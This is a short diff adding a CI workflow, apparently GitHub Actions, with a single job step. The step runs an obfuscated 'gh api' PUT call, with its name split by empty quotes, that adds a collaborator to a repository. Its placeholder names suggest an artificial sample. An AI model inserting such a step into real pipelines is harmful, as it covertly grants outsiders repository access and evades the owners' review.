@@ -1,0 +1,4 @@
+jobs:
+  decide:
+    steps:
+      - run: xargs g""h a""pi -X PUT repos/o/r/collaborators/person
